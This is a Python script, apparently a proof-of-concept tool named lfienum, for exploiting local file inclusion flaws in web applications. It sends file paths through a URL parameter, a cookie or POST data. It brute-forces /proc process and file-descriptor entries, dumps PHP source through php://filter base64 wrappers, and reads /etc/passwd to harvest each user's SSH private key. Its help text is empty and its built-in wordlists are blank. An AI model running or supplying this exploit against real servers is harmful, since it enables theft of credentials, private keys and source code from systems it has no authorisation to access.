#!/usr/bin/python3
# lfienum (PoC) by 0bfxgh0st*
import sys, requests, re, base64, os
from bs4 import BeautifulSoup

ColGreenMark="\033[1;32m"
ColYellow="\033[0;33m"
ColYellowMark="\033[1;33m"
ColRedMark="\033[1;31m"
ColEnd="\033[0m"

def Help():
  pass

def AdHelp():
  pass

if '-h' in sys.argv or '--help' in sys.argv:
  Help()
  exit(1)
if '-ah' in sys.argv or '--advanced-help' in sys.argv:	
  Help()
  AdHelp()
  exit(1)
try:
  url = sys.argv[1]
except IndexError:
  Help()
  exit(1)

headers = {
  'User-Agent': '--'
}
if os.environ.get('LFI_COOKIE'):
  headers['Cookie'] = os.environ['LFI_COOKIE']

def CheckCon():

  try:		
    r = request(url, headers=headers, timeout=10)
    try:
      selection_wordlist = [linux_wordlist,windows_wordlist]
      if 'microsoft'.casefold() in r.headers['Server'].casefold() or 'asp.net'.casefold() in r.headers['X-Powered-By'].casefold():
        prior_wordlist = selection_wordlist[1]
        later_wordlist = selection_wordlist[0]
      else:
        prior_wordlist = selection_wordlist[0]
        later_wordlist = selection_wordlist[1]	
    except KeyError:
      prior_wordlist = selection_wordlist[0]
      later_wordlist = selection_wordlist[1]
      pass		
  except requests.exceptions.ConnectTimeout:
    print ('Connection timed out.')
    exit(1)	
  except requests.exceptions.ConnectionError:	
    print ('Failed to establish a new connection: [Errno -2] Name or service not known')
    exit(1)
  except requests.exceptions.MissingSchema:
    print ("Invalid URL '" + url + "': No scheme supplied.")
    exit(1)

  return prior_wordlist,later_wordlist

def XCF_A(response):                  # this function aims to print all text between tags (default)

  proc_out = re.sub('<[^<]+?>', '', response.text)			
  content = proc_out.strip()
  return content

def XCF_B(response):                  # this function aims to print all text that isn't between any tag

  proc_out = re.sub('<[^<].*>', '', response.text)
  content = proc_out.strip()
  return content

def XCF_C(response):                  # this function aims to print content between specific tags

  soup = BeautifulSoup(response.content, 'html.parser')
  try:
    content = soup.find_all('p')[0].text.strip()
  except IndexError:
    Help()
    print("\n\nWARNING: Could not find correct tag, consider use of other -x flag")
    exit(1)
  #for i in soup.find_all(["p"]):
    #content = i.text
  return content
  
def XCF_D(response):                  # this function aims to delete all content inside <html> & </html> tags 

  soup = BeautifulSoup(response.content, 'html.parser')
  for i in soup.find_all('html'):
    i.decompose()   # same as i.replaceWith('')
  content = soup.get_text().strip()
  return content

def PackageStatus(response,content):

  print ('[Response Code]:', response.status_code)
  print ('[Content Lenght]:', len(content))
  lines = 0
  for nl in content:
    if nl == '\n':
      lines += 1
  print ('[Content Lines]:', lines+1, '\n')
	
only_url=False
package_status=False
if '-v' in sys.argv or '-vvv' in sys.argv:
  package_status=True	
if '--only-url' in sys.argv or '-ou' in sys.argv:
  only_url=True

XCF = XCF_A
if '-x1' in sys.argv:
	XCF = XCF_A
if '-x2' in sys.argv:
	XCF = XCF_B
if '-x3' in sys.argv:
	XCF = XCF_C
if '-x4' in sys.argv:
	XCF = XCF_D

linux_wordlist=[]

windows_wordlist=[]


def Enum(prior_wordlist, later_wordlist):

  for wordlist in prior_wordlist,later_wordlist:
    for possible_lfi_file in wordlist:
      if cookie_mode == True:
        response = request(url, cookies={cookie:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
      if data_mode == True:
        response = request(url, data={data:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)		
      if cookie_mode is None and data_mode is None:		
        response = request(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
        content = XCF(response)       			        
        if len(content) > 0 and content != blacklist:
          if cookie_mode == True:
            print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file + ColEnd)
          if data_mode == True:
            print (ColGreenMark + "> " + url + ' ' + data + '=' + possible_lfi_file + ColEnd)			
          if cookie_mode is None and data_mode is None:				
            print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
          if package_status == True:	
            PackageStatus(response, content)	
          if only_url == False:		
            print (content)

  return response

	
def Wordlist():

  with open(wordlist, 'r') as custom_wordlist:
    for possible_lfi_file in custom_wordlist:    
      if cookie_mode == True:
        response = request(url, cookies={cookie:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)			
      if data_mode == True:
        response = request(url, data={data:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)			
      if cookie_mode is None and data_mode is None:
        response = request(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
        content = XCF(response)
        if len(content) > 0 and content != blacklist:				
          if cookie_mode == True:					
            print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file.strip() + ColEnd)						
          if data_mode == True:
            print (ColGreenMark + "> " + url + ' ' + data + '=' + possible_lfi_file + ColEnd)				
          if cookie_mode is None and data_mode is None:					
            print (ColGreenMark + "> " + url + possible_lfi_file.strip() + ColEnd)					
          if package_status == True:	
            PackageStatus(response,content)						
          if only_url == False:					
            print (content)

  return response

def PIDS():
  	
  print ("Bruteforcing 0-" + str(pids) + " PIDS\n")
  for pid in range(pids+1):
    if cookie_mode == True:		
      response = request(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)		
    if data_mode == True:
      response = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)		
    if cookie_mode is None and data_mode is None:		
      response = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
      content = XCF(response)
      if len(content) > 0 and content != blacklist:
        if only_url == False:
          print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + content.strip())
        if only_url == True:				
          if cookie_mode == True:					
            print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)						
          if data_mode == True:					
            print (ColGreenMark + "> " + url + ' ' + data + '=/proc/' + str(pid) + '/cmdline' + ColEnd)					
          if cookie_mode is None and data_mode is None:					
            print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
        if package_status == True:	
          PackageStatus(response, content)

  return response

def PID():

  if cookie_mode == True:		
    response = request(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)		
  if data_mode == True:
    response = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)	
  if cookie_mode is None and data_mode is None:		
    response = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
  if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
    content = XCF(response)
    if len(content) > 0 and content != blacklist:
      if only_url == False:
        print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + content.strip())
      if only_url == True:			
        if cookie_mode == True:				
          print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)					
        if data_mode == True:				
          print (ColGreenMark + "> " + url + ' ' + data + '=/proc/' + str(pid) + '/cmdline' + ColEnd)									
        if cookie_mode is None and data_mode is None:
          print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
      if package_status == True:	
        PackageStatus(response, content)
        
  return response

def FD(fd):

  print ("Bruteforcing 0-" + str(fd) + " /proc/self/fd/X\n")
  for fd in range(fd+1):
    if cookie_mode == True:		
      response = request(url, cookies={cookie:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)		
    if data_mode == True:
      response = request(url, data={data:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)		
    if cookie_mode is None and data_mode is None:
      response = request(url + '/proc/self/fd/' + str(fd), verify=True, headers=headers, allow_redirects=False)
    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
      content = XCF(response)
      if len(content) > 0 and content != blacklist:		
        if cookie_mode == True:				
          print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/self/fd/' + str(fd) + ColEnd)					
        if data_mode == True:				
          print (ColGreenMark + "> " + url + ' ' + data + '=/proc/self/fd/' + str(fd) + ColEnd)						
        if cookie_mode is None and data_mode is None:				
          print (ColGreenMark + "> " + url + '/proc/self/fd/' + str(fd) + ColEnd)				
        if package_status == True:	
          PackageStatus(response, content)				
        if only_url == False:				
          print(content)
          
  return response

def Wrapper():

  if cookie_mode == True:	
    response = request(url, cookies={cookie:'php://filter/convert.base64-encode/resource=' + wrapper}, verify=True, headers=headers, allow_redirects=False)		
  if data_mode == True:
    response = request(url, data={data:'php://filter/convert.base64-encode/resource=' + wrapper}, verify=True, headers=headers, allow_redirects=False)	
  if cookie_mode is None and data_mode is None:
    response = request(url + 'php://filter/convert.base64-encode/resource=' + wrapper, verify=True, headers=headers, allow_redirects=False)	
  content = XCF(response)	
  if len(content) > 0 and content != blacklist:		
    if cookie_mode == True:		
      print(ColGreenMark + "> " + url + ' ' + cookie + '=php://filter/convert.base64-encode/resource=' + wrapper + ColEnd)			
    if data_mode == True:		
      print(ColGreenMark + "> " + url + ' ' + data + '=php://filter/convert.base64-encode/resource=' + wrapper + ColEnd)	
    if cookie_mode is None and data_mode is None:		
      print(ColGreenMark + "> " + url + 'php://filter/convert.base64-encode/resource=' + wrapper + ColEnd)		
    if package_status == True:		
      print ('[Response Code]:', response.status_code)
      print ('[Encoded Content Lenght]:', len(content), '\n')
    if only_url == False:
      print (content.strip("\n"))			
      try:
        print("\n" + base64.b64decode(content).decode('utf-8'))	
      except UnicodeDecodeError:	
        print ('\n\n' + ColRedMark + 'Something went wrong while decoding base64. Junk data? Try decoding manually or use other XCF function' + ColEnd + '\n')
        exit(1)
        
  return response
	
def IdRSA():

  if cookie_mode == True:	
    response = request(url, cookies={cookie:'/etc/passwd'}, headers=headers)		
  if data_mode == True:	
    response = request(url, data={data:'/etc/passwd'}, headers=headers)	
  if cookie_mode is None and data_mode is None:			
    response = request(url + '/etc/passwd', headers=headers)	
  for fetch_users in response.text.split('\n'):
    if ':/home/' in fetch_users:		
      if cookie_mode == True:			
        fetch_id_rsa = request(url, cookies={cookie:'/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa'}, verify=True, headers=headers, allow_redirects=False)				
      if data_mode == True:			
        fetch_id_rsa = request(url, data={data:'/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa'}, verify=True, headers=headers, allow_redirects=False)			
      if cookie_mode is None and data_mode is None:			
        fetch_id_rsa = request(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa', verify=True, headers=headers, allow_redirects=False)
      response = fetch_id_rsa
      if fetch_id_rsa.status_code == 200 or fetch_id_rsa.status_code == 301 or fetch_id_rsa.status_code == 302:
        content = XCF(response)
        if len(content) > 0 and content != blacklist:
          if cookie_mode == True:					
            print (ColGreenMark + '> ' + url + ' ' + cookie + '=/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)						
          if data_mode == True:					
            print (ColGreenMark + '> ' + url + ' ' + data + '=/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)						
          if cookie_mode is None and data_mode is None:					
            print (ColGreenMark + '> ' + url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)					
          if only_url == False:						
            print (ColYellowMark + '> ' + fetch_users.split(":")[0].strip() + ' id_rsa private key' + ColEnd)					
          if package_status == True:	
            PackageStatus(response, content)
          if only_url == False:					
            print (content)
            
  return response

request = requests.get						
cookie_mode = None
data_mode = None
wordlist = None
pid = None
pids = None
wrapper = None
key = None
fd = None
blacklist = None

def Main():
	
  arguments_list = []
  for arg in sys.argv:
    arguments_list.append(arg)
  for argument in arguments_list:  
    if argument == '-w' or argument == '--wordlist':
      global wordlist
      n = arguments_list.index(argument)+1
      wordlist = arguments_list[n]
    if argument == '-X':
      global request
      n = arguments_list.index(argument)+1
      try:
        method = arguments_list[n]
        if method.casefold() == 'POST'.casefold():
          request = requests.post
        elif method.casefold() == 'GET'.casefold():
          request = requests.get
      except IndexError:
        print ("method usage example:")
        print ("python3 lfienum http://ghost.server/index.php -X POST --data-mode file")
        exit(1)
    if argument == '--pid':
      global pid
      n = arguments_list.index(argument)+1
      try:
        pid = int(arguments_list[n])
      except (IndexError,ValueError):
        print ("single pid usage:")
        print ('python3 lfienum "http://ghost.server/index.php?page=" --pid 1')
        exit(1)
    if argument == '--pids':
      global pids
      n = arguments_list.index(argument)+1
      try:
        pids = int(arguments_list[n])
      except IndexError:
        pids = 999
      except ValueError:
        print ("bruteforce pids usage:")
        print ('python3 lfienum "http://ghost.server/index.php?page=" --pids 500')
        exit(1)		
    if argument == '--wrapper':
      global wrapper
      n = arguments_list.index(argument)+1
      try:
        wrapper = arguments_list[n]	
      except IndexError:
        print ("wrapper argument usage example:")
        print ("python3 lfienum http://ghost.server/index.php?page= --wrapper index.php")
        exit(1)		
    if argument == '-k' or argument == '--key':
      global key
      key = True
    if argument == '--fd':
      global fd
      n = arguments_list.index(argument)+1
      try:
        fd = int(arguments_list[n])
      except IndexError:
        fd = 30
      except ValueError:
        print ("bruteforce fd usage:")
        print ('python3 lfienum "http://ghost.server/index.php?page=" --fd 9')
        exit(1)		
    if argument == '--cookie-mode':
      global cookie_mode
      global cookie
      cookie_mode = True
      n = arguments_list.index(argument)+1
      try:
        cookie = arguments_list[n]
      except IndexError:
        print ("cookie usage example:")
        print ("python3 lfienum http://ghost.server/index.php --cookie-mode 'session'")
        exit(1)		
    if argument == '--data-mode':
      global data_mode
      global data
      data_mode = True
      n = arguments_list.index(argument)+1
      try:
        data = arguments_list[n]
      except IndexError:
        print ("data usage example:")
        print ("python3 lfienum http://ghost.server/index.php -X POST --data-mode 'file'")
        exit(1)				
    if argument == '--exclude':
      global blacklist
      n = arguments_list.index(argument)+1
      try:			
        blacklist = arguments_list[n]
      except IndexError:
        print ("exclude usage example:")
        print ("python3 lfienum http://ghost.server/index.php --exclude 'File not found.'")
        exit(1)
				
  if '--data-mode' in sys.argv and not '-X' in sys.argv:
    request = requests.post
    				
  if wordlist is not None:
    Wordlist()
  if pid is not None:
    PID()
  if pids is not None:
    PIDS()
  if wrapper is not None:
    Wrapper()
  if key is not None:
    IdRSA()
  if fd is not None:
    FD(fd)
	
  if 'http' in sys.argv[1] and not '--pids' in sys.argv and not '--pid' in sys.argv and not '--fd' in sys.argv and not '--wrapper' in sys.argv and not '-w' in sys.argv and not '--wordlist' in sys.argv and not '-k' in sys.argv and not '--key' in sys.argv:

    prior_wordlist,later_wordlist = CheckCon()
    Enum(prior_wordlist,later_wordlist)
    IdRSA()

CheckCon()
Main()
